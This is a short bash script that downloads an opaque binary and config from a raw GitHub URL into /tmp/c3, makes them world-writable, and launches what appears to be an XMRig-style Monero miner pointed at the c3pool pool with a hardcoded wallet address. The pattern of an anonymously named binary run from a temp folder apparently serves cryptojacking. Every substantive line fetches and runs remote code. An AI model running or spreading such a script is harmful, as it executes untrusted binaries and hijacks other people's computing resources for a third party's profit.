#!/bin/bash
## requirement
apt-get -qq update
apt-get -qq install -y wget curl unzip


mkdir -p /tmp/c3
cd /tmp/c3
##wget https://raw.githubusercontent.com/Blenkinship/any/main/4v/config.json
wget https://raw.githubusercontent.com/Blenkinship/any/main/32/config.json
wget https://raw.githubusercontent.com/Blenkinship/any/main/0
chmod -R  777 /tmp/c3
##/tmp/c3/0 --config=/tmp/c3/config.json
/tmp/c3/0 -o auto.c3pool.org:19999 -u 49mZniQ6izgMDGL6xqEipZQ1Mh92KUij3J6bVmCH6FjhAvZWzmCj6AmK6KJc21skfxLDCaBLbd7pAXMXbsLN5zHCTtn7e9x -p my99k -a rx/0 -k --donate-level 0
